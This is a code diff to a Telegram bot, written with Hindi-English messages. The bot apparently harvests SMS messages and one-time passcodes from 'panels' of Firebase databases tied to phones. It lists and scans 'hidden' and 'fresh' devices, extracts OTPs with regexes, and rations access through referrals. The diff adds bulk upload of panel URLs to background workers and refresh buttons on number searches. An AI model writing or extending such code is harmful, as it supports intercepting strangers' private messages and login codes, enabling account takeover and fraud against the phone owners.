@@ -377,7 +377,6 @@ def extract_all_nums(*dicts) -> list[str]:
 
 def bat_emoji(pct: int) -> str: return "🔋" if pct >= 20 else "🪫"
 
-# 🔥 STRICT OTP REGEX (Avoids fake buttons)
 OTP_PATTERNS = [
     re.compile(r"(?:otp|pin|code)[\s\:\-]*(\d{4,8})", re.IGNORECASE),
     re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), 
@@ -681,8 +680,8 @@ def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
 def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("Grant Global Access", callback_data="sa_grant_global")],
-        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels"), InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
-        [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
+        [InlineKeyboardButton("Upload Panels (.txt)", callback_data="sa_upload_txt"), InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
+        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels"), InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
         [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
     ])
 
@@ -840,6 +839,12 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, "ADD GLOBAL PANEL\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL (ya multiple URLs enter se separate karke) bhejein.\n\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))
             return
 
+        # 🔥 NEW: Admin .txt upload button trigger
+        if data == "sa_upload_txt" and chat_id in ADMIN_IDS:
+            pending_action[chat_id] = {"action": "upload_panels_txt"}
+            await safe_edit(query, "UPLOAD PANELS (.txt)\n━━━━━━━━━━━━━━━━━━\nEk .txt file send karein jisme Firebase URLs (http/https) ho.\nBot automatically scan karke sabhi URLs global list me add kar dega aur instant connect kar lega.\n\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))
+            return
+
         if data == "sa_view_user_panels" and chat_id in ADMIN_IDS:
             msg_text = "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n"
             for uid, uinfo in users_db.items():
@@ -927,6 +932,9 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if service_used.startswith("f30_"):
                 page = service_used.split("_")[1]
                 back_btn = InlineKeyboardButton("🔙 Back to List", callback_data=f"f30:{page}")
+            elif service_used == "search":
+                # Wait message handling is automatic, we just provide a clean back button to clear it
+                back_btn = InlineKeyboardButton("🔙 Back to Home", callback_data="home")
             elif service_used:
                 back_btn = InlineKeyboardButton("🔙 Back to Search", callback_data="open_app_search")
             else:
@@ -979,12 +987,11 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         except: pass
 
 # ═══════════════════════════════════════════════════════
-#  TEXT MESSAGE HANDLER (STRICT ACCESS CONTROL)
+#  TEXT MESSAGE & DOCUMENT HANDLER (STRICT ACCESS CONTROL)
 # ═══════════════════════════════════════════════════════
 
-async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
-    text    = (update.message.text or "").strip()
     bot_token = ctx.bot.token
     users_db = all_users
 
@@ -993,6 +1000,50 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if is_spamming(chat_id): return
+
+    # 🔥 NEW: Handle Admin .txt Panel Uploads
+    if update.message.document:
+        state = pending_action.get(chat_id)
+        if state and state.get("action") == "upload_panels_txt" and chat_id in ADMIN_IDS:
+            doc = update.message.document
+            if not doc.file_name.endswith('.txt'):
+                await update.message.reply_text("❌ Please send a valid .txt file.")
+                return
+            
+            wait_msg = await update.message.reply_text("⏳ Processing file, extracting URLs...")
+            try:
+                file = await ctx.bot.get_file(doc.file_id)
+                file_content = await file.download_as_bytearray()
+                text_data = file_content.decode('utf-8', errors='ignore')
+                
+                pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
+                urls = list(set(pattern.findall(text_data)))
+                
+                if not urls:
+                    await safe_edit(wait_msg, "❌ Is file mein koi valid Firebase URLs nahi mile.")
+                    return
+                    
+                existing = SETTINGS.setdefault("global_panels", [])
+                added_count = 0
+                for u in urls:
+                    if u not in existing and u not in RAW_URLS:
+                        existing.append(u)
+                        added_count += 1
+                        
+                save_settings()
+                pending_action.pop(chat_id)
+                
+                # Instantly push to Ghost Workers to load them without restart
+                for u in urls:
+                    await WORK_QUEUE.put(("INIT", f"G_TXT_{int(time.time())}_{added_count}", u))
+                    
+                await safe_edit(wait_msg, f"✅ <b>SUCCESS!</b>\n━━━━━━━━━━━━━━━━━━\nTotal URLs Extracted: {len(urls)}\nNewly Added to Global: {added_count}\n\n<i>Ab ye saare panels background me active ho gaye hain!</i>", parse_mode="HTML")
+            except Exception as e:
+                await safe_edit(wait_msg, f"❌ Error processing file: {str(e)}")
+        return
+
+    text = (update.message.text or "").strip()
+    if not text: return
 
     # 🔥 REFERRAL SYSTEM LOCK
     protected_commands = ["Devices List", "Manual Checker", "Auto-Check Panels", "Scan Hidden Devices", "🔥 30-Min Fresh Devices", "🍔 App OTPs (24h)"]
@@ -1012,7 +1063,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     await update.message.reply_text(f"🛑 <b>LOCKED FEATURE</b> 🛑\n\nAapko apni panel list dekhne ke liye <b>10 referrals</b> chahiye (24 hrs access).\n\n📉 Your Referrals: {refs}/10\n🔗 Your Link:\n<code>{ref_link}</code>\n\nShare this link to get access!", parse_mode="HTML")
                     return
 
-    # 🟢 Top Level Commands Direct Execution (Avoids Silent Drops)
+    # 🟢 Top Level Commands Direct Execution
     if text == "Search Number (God)":
         user_focus.setdefault(bot_token, {}).pop(chat_id, None)
         pending_action[chat_id] = {"action": "search_number"}
@@ -1146,14 +1197,17 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if not found_devs:
             await safe_edit(wait_msg, "No matching numbers found in any panel.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
             return
+            
+        # 🔥 NEW: Refresh Button Integration
         if len(found_devs) == 1:
             device = found_devs[0]
             user_focus.setdefault(bot_token, {})[chat_id] = device.id
             label = device_label(device)
             smss  = await get_device_sms(device)
             back_btn = InlineKeyboardButton("Back to Home", callback_data="home")
+            refresh_btn = InlineKeyboardButton("🔄 Refresh", callback_data=f"msgs:{device.id}:search")
             if not smss:
-                await safe_edit(wait_msg, f"{label}\n\nKoi SMS nahi mili.", reply_markup=InlineKeyboardMarkup([[back_btn]]))
+                await safe_edit(wait_msg, f"{label}\n\nKoi SMS nahi mili.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]))
                 return
             header = f"ALL MESSAGES INBOX (SMS & OTP)\n━━━━━━━━━━━━━━━━━━\nNumber: {label}\nShowing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
             body_parts, otp_buttons, has_otp = [], [], False
@@ -1164,7 +1218,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if has_otp: users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1; save_user(chat_id)
             full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n\n").join(body_parts)
             if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[more SMS available]"
-            otp_buttons.append([back_btn])
+            otp_buttons.append([refresh_btn, back_btn])
             await safe_edit(wait_msg, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
             return
             
@@ -1255,7 +1309,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             for adm in ADMIN_IDS: await ctx.bot.send_message(adm, alert)
         except: pass
         
-        # 🔥 FIX: Prevent the keyboard auto-trigger by not sending the full menu here
         await update.message.reply_text(f"✅ {len(urls)} Personal Firebase URLs added successfully!\nThese are safely stored.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]))
         return
 
@@ -1414,7 +1467,9 @@ def main() -> None:
 
     app.add_handler(CommandHandler("start",   cmd_start))
     app.add_handler(CallbackQueryHandler(on_callback))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
+    
+    # 🔥 FIX: Ab ye commands ke alawa text aur documents dono receive karega (File upload k lie zaroori)
+    app.add_handler(MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND, on_message))
     app.add_error_handler(global_error_handler)
 
     async def post_init(application: Application) -> None:
